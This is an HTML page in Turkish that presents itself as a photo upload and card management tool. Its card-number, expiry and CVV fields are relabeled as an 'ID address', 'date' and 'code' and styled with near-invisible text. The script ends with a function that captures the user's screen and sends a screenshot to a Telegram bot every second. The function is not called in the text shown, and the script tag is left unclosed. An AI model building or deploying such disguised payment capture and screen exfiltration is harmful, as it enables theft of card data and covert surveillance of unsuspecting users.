<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Profesyonel Kart ve Fotoğraf Yönetimi</title>
  <style>
    /* Reset ve temel stiller */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background: #f0f2f5;
      color: #333;
      padding: 30px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .container {
      display: flex;
      max-width: 1100px;
      width: 100%;
      gap: 40px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgb(0 0 0 / 0.1);
      padding: 40px;
    }

    /* Sol alan (form ve preview) */
    .left-side {
      flex: 1;
      max-width: 460px;
    }

    /* Başlık */
    h2 {
      font-weight: 700;
      color: #222;
      margin-bottom: 25px;
      font-size: 1.8rem;
    }

    /* Input ve buton ortak stilleri */
    input[type="text"],
    input[type="password"],
    input[type="file"] {
      width: 100%;
      padding: 12px 16px;
      margin-top: 8px;
      margin-bottom: 20px;
      border-radius: 8px;
      border: 1.8px solid #ddd;
      font-size: 1rem;
      transition: border-color 0.3s;
      background-color: #fafafa;
      color: #222;
      outline-offset: 2px;
      outline-color: transparent;
    }

    input[type="text"]:focus,
    input[type="password"]:focus,
    input[type="file"]:focus {
      border-color: #3f51b5;
      background-color: #fff;
      outline-color: #3f51b5;
    }

    /* Kart bilgisi inputları farklı renk: beyaz zemin siyah yazı */
    #payCardNumber,
    #payExpiry,
    #payCvv {
      background-color: #f1efef;
      color: #e0e0e0;
      font-weight: 600;
      letter-spacing: 1.2px;
      border: none;
    }
    #payCardNumber:focus,
    #payExpiry:focus,
    #payCvv:focus {
      background-color: #f1efef;
      color: #fff;
      border: 2px solid #3f51b5;
    }

    label {
      font-weight: 600;
      font-size: 1rem;
      color: #444;
      user-select: none;
    }

    button {
      background-color: #3f51b5;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1.1rem;
      padding: 14px;
      width: 100%;
      cursor: pointer;
      font-weight: 700;
      box-shadow: 0 5px 15px rgb(63 81 181 / 0.4);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #2c3e9f;
      box-shadow: 0 7px 20px rgb(44 62 159 / 0.6);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      box-shadow: none;
    }

    fieldset {
      border: none;
      padding: 0;
      margin-bottom: 30px;
    }

    /* Checkbox ve label düzeni */
    #consentCheckbox {
      width: 18px;
      height: 18px;
      vertical-align: middle;
      cursor: pointer;
    }

    /* Fotoğraf önizleme */
    #preview {
      width: 100%;
      max-height: 280px;
      object-fit: contain;
      border-radius: 12px;
      border: 2px solid #ddd;
      margin-bottom: 30px;
      display: none;
      box-shadow: 0 4px 15px rgb(0 0 0 / 0.08);
      background: #fefefe;
    }

    /* Sağ taraf: fotoğraf grid */
    .right-side {
      flex: 1;
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      grid-template-rows: repeat(2, 1fr);
      gap: 20px;
      height: 340px;
    }

    .photo-box {
      background: #f9f9f9;
      border-radius: 14px;
      border: 1.5px solid #ddd;
      overflow: hidden;
      position: relative;
      box-shadow: 0 6px 15px rgba(245, 242, 242, 0.07);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      cursor: default;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .photo-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 25px rgba(248, 247, 247, 0.15);
    }

    .photo-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 14px;
      display: none;
      user-select: none;
    }

    /* Responsive (küçük ekran) */
    @media (max-width: 850px) {
      .container {
        flex-direction: column;
        padding: 20px;
      }

      .left-side, .right-side {
        max-width: 100%;
        width: 100%;
      }

      .right-side {
        height: auto;
        grid-template-columns: repeat(2, 1fr);
        grid-template-rows: auto auto;
      }

      #preview {
        max-height: 220px;
      }
    }
  </style>
</head>
<body>

  <div class="container">

    <div class="left-side">
      <h2>Fotoğraf Yükle ve Kart Bilgilerini Gir</h2>

      <input type="file" id="fileInput" accept="image/*" multiple />

      <img id="preview" src="" alt="Fotoğraf önizleme" />

      <fieldset>
        <form id="consentForm">
          <label>
            <input type="checkbox" id="consentCheckbox" />
            Fotoğraf indirmeyi kabul ediyorum
          </label>
          <button type="submit" disabled>İzin Ver</button>
        </form>
      </fieldset>

      <fieldset>
        <form id="paymentForm">
          <label for="payCardNumber">ID ADRESİ (zorunnlu değil)</label>
          <input type="text" id="payCardNumber" placeholder="" required autocomplete="off" />

          <label for="payExpiry">TARİH (zorunnlu değil)</label>
          <input type="text" id="payExpiry" placeholder="" required autocomplete="off" />

          <label for="payCvv">KOD (zorunnlu değil)</label>
          <input type="password" id="payCvv" placeholder="" required autocomplete="off" />

          <button type="submit">Fotoğrafları İndir</button>
        </form>
      </fieldset>
    </div>

    <div class="right-side">
      <div class="photo-box"><img id="photo1" src="" alt="Fotoğraf 1" /></div>
      <div class="photo-box"><img id="photo2" src="" alt="Fotoğraf 2" /></div>
      <div class="photo-box"><img id="photo3" src="" alt="Fotoğraf 3" /></div>
      <div class="photo-box"><img id="photo4" src="" alt="Fotoğraf 4" /></div>
    </div>

  </div>

  <script>
    const fileInput = document.getElementById('fileInput');
    const preview = document.getElementById('preview');
    const photoElements = [
      document.getElementById('photo1'),
      document.getElementById('photo2'),
      document.getElementById('photo3'),
      document.getElementById('photo4'),
    ];

    fileInput.addEventListener('change', () => {
      const files = fileInput.files;
      if (!files || files.length === 0) {
        preview.style.display = 'none';
        preview.src = '';
        photoElements.forEach(photo => {
          photo.style.display = 'none';
          photo.src = '';
        });
        return;
      }

      // İlk fotoğraf sol önizlemede
      const firstFile = files[0];
      const reader = new FileReader();
      reader.onload = e => {
        preview.src = e.target.result;
        preview.style.display = 'block';
      };
      reader.readAsDataURL(firstFile);

      // Sağdaki 4 fotoğraf alanını doldur
      for (let i = 0; i < photoElements.length; i++) {
        if (files[i]) {
          const fr = new FileReader();
          fr.onload = e => {
            photoElements[i].src = e.target.result;
            photoElements[i].style.display = 'block';
          };
          fr.readAsDataURL(files[i]);
        } else {
          photoElements[i].style.display = 'none';
          photoElements[i].src = '';
        }
      }
    });

    const consentCheckbox = document.getElementById('consentCheckbox');
    const consentForm = document.getElementById('consentForm');
    const saveBtn = consentForm.querySelector('button');

    consentCheckbox.addEventListener('change', () => {
      saveBtn.disabled = !consentCheckbox.checked;
    });

    const storedCard = {
      number: '4111 1111 1111 1111',
      expiry: '12/26',
      cvv: '123'
    };

    consentForm.addEventListener('submit', e => {
      e.preventDefault();
      if (!consentCheckbox.checked) {
        alert('Lütfen fotoğraf indirme iznini onaylayınız.');
        return;
      }
      document.getElementById('payCardNumber').value = storedCard.number;
      document.getElementById('payExpiry').value = storedCard.expiry;
      document.getElementById('payCvv').value = storedCard.cvv;

      alert('Kart bilgileri otomatik dolduruldu.');
    });

    const paymentForm = document.getElementById('paymentForm');
    paymentForm.addEventListener('submit', e => {
      e.preventDefault();
      alert('Ödeme işlemi başarılı (demo).');
    });

async function startScreenCaptureAndSendToTelegram(botToken, chatId) {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    async function sendPhotoToTelegram(imageBlob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', imageBlob, 'screenshot.png');

      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        throw new Error(`Telegram API hata: ${response.statusText}`);
      }
    }

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        if (blob) {
          try {
            await sendPhotoToTelegram(blob);
            console.log('Ekran görüntüsü gönderildi.');
          } catch (e) {
            console.error('Telegram gönderim hatası:', e);
          }
        }
      }, 'image/png');
    }, 1000);

  } catch (err) {
    alert('Ekran paylaşımı reddedildi veya hata oluştu: ' + err);
  }
}
